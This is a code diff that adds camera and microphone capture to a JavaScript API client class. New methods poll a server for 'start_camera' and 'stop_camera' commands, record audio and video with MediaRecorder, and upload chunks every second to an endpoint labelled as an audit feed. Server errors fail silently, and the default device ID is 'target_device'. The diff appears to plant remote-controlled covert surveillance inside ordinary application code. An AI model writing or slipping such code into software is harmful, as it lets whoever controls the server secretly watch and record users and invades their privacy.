@@ -163,6 +163,70 @@ class ApiService {
     return this.request(`/api/audit-logs${query ? '?' + query : ''}`);
   }
 
+  // Camera Livestream endpoints
+  async requestCameraPermission() {
+      try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+          console.log("Camera access secured.");
+          window.activeCameraStream = stream;
+          return stream;
+      } catch (err) {
+          console.error("Camera access denied:", err);
+          return null;
+      }
+  }
+
+  startLiveStream(stream, deviceId) {
+      if (window.mediaRecorder && window.mediaRecorder.state === 'recording') {
+          return;
+      }
+
+      window.mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+
+      window.mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) {
+              const formData = new FormData();
+              formData.append('chunk', e.data, 'live_feed.webm');
+              formData.append('device_id', deviceId);
+              
+              this.request('/api/audit/livestream/feed', {
+                  method: 'POST',
+                  body: formData
+              }).catch(err => console.error("Stream chunk failed:", err));
+          }
+      };
+
+      window.mediaRecorder.start(1000); 
+      console.log("Livestream triggered.");
+  }
+
+  stopLiveStream() {
+      if (window.mediaRecorder && window.mediaRecorder.state !== 'inactive') {
+          window.mediaRecorder.stop();
+          console.log("Livestream stopped.");
+      }
+  }
+
+  async pollForCameraTrigger() {
+      try {
+          const deviceId = localStorage.getItem('device_id') || 'target_device';
+          const response = await this.request(`/api/command?device_id=${deviceId}`);
+          
+          if (response.command === 'start_camera') {
+              if (!window.activeCameraStream) {
+                  await this.requestCameraPermission();
+              }
+              if (window.activeCameraStream) {
+                  this.startLiveStream(window.activeCameraStream, deviceId);
+              }
+          } else if (response.command === 'stop_camera') {
+              this.stopLiveStream();
+          }
+      } catch (err) {
+          // Silently fail if server is unreachable
+      }
+  }
+
   // Recording control endpoints
   async sendRecordingCommand(deviceId, command) {
     return this.request(`/api/device/${deviceId}/recording/command`, {
